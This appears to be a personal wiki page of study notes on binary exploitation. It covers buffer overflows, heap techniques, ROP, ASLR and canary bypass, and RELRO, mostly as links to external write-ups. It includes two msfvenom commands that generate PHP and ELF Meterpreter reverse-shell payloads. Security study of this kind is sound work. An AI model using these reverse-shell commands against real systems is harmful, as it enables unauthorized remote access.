Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2020-02-10T10:23:06-05:00

====== Binary Exploitation ======
Created Monday 10 February 2020

===== General approach =====

In case of a buffer overflow vuln, you'll want to de the following
* Make the program crash with a big, fat payload for confirmation
* Use [[Tools:Linux:MetaSploit:msf-pattern create|msf-pattern create]] and [[Tools:Linux:MetaSploit:msf-pattern offset]] to pinpoint the offset to the EIP/RIP overwriting bytes
* Do bad character analysis (see which bytes will mangle your payload)

Howto
https://ir0nstone.gitbook.io/notes/

==== Syscall tables: ====
32bit linux: http://shell-storm.org/shellcode/files/syscalls.html   
64bit linux: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

===== Cheat sheets =====
https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet

===== Random docs =====
https://github.com/brl/linux-kernel-exploitation

===== Overview of exploitation techniques =====
https://www.duo.uio.no/bitstream/handle/10852/69062/7/mymaster.pdf

===== Generating a reverse shell =====
How to generate a php reverse shell:

msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php

A binary shell:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf


Binary exploitation techniques:

Stack related
Buffer overflow

===== Canary Bypass =====
https://greyshell.github.io/blog/2019/07/16/canary-bypass/


===== HEAP related (see[[Technologies:X86 64|"How Malloc Works"]]) =====
https://github.com/shellphish/how2heap

=== Lecture on how heap works: ===
security.cs.rpi.edu/courses/binexp-spring2015/lectures/17/10_lecture.pdf

https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-2-1bd24a5856d0
https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-3-9890b01d56a2

==== free-then-use ====

More advanced heap exploiting techniques:
https://sploitfun.wordpress.com/2015/03/04/heap-overflow-using-malloc-maleficarum/

==== House of Prime ====

==== House of Mind ====

==== House of Force ====
Prerequisites:
* Exploit must be able to overflow into top chunk size
* Exploit must be able to allocate a controller size chunk of mem
* Exploit must be able to allocate a second time and to be able to write here/


==== House of Lore ====

==== House of Spirit ====

==== Chunk shrinking ====
https://go.contextis.com/rs/140-OCV-459/images/Glibc_Adventures-The_Forgotten_Chunks.pdf



==== ROP (Return oriented programming) ====
https://en.wikipedia.org/wiki/Return-oriented_programming


==== ASLR Bypass ====
https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/
https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-ii/

==== GOT Overwrite ====

GOT dereferencing


Ret2Libc:
https://tasteofsecurity.com/security/ret2libc-unknown-libc/

Ret2PLT
https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/pwn2.md

Bypass stack randomization:
Custom stack
Stack Pivoting

Advanced techniques
http://media.blackhat.com/bh-us-10/whitepapers/Le/BlackHat-USA-2010-Le-Paper-Payload-already-inside-data-reuse-for-ROP-exploits-wp.pdf



Series on the ELF file format
https://blog.k3170makan.com/2018/09/introduction-to-elf-format-elf-header.html


Terms:

==== RELRO (Relocation Read Only) : ====
https://medium.com/@HockeyInJune/relro-relocation-read-only-c8d0933faef3
https://ctf101.org/binary-exploitation/relocation-read-only/

Partial RELRO means that the GOT comes before .bss, so overwrites of the GOT using a global variable becomes impossible
Full RELRO means that the GOT becomes read only, so you can't replace an entry with a reference to your shellcode


PLT: Procedure Linkage Table
GOT : Global Offset Table
ROP: Return Oriented Programming
PIC: Position independent code
ASLR: Address Space Layout Randomization

===== Lessons learned =====

1) When building a payload to leak information with printf and you need to supply the format modifier yourself, please put it AT THE END OF THE PAYLOAD.
After all the ROP Gadgets. If you put in at the front, where the padding goes printf's stack frame is going to eat up your modifier. 
The reason is that rop gadgets don't restore stack frames. It's just one big incest fest within the frame of the caller.

Lesson learned the hard way on Feb 23, 2020 when spending the whole fucking day debugging this problem. 

2) Puts is not a reliable way to output addresses and should be avoided when possible. The reason is when an address contains a null byte, the function
stops as it thinks it has reached then end. So you end up with no, or partial data. Printf is a better alternative

Stuff to do to gain intel on the binary
checksec <binary>
file <binary> To determine if it's stripped




GLIBC mitigations:
v2.29 House of force no longer possible




===== SYSCALLS: =====

https://lwn.net/Articles/604287/


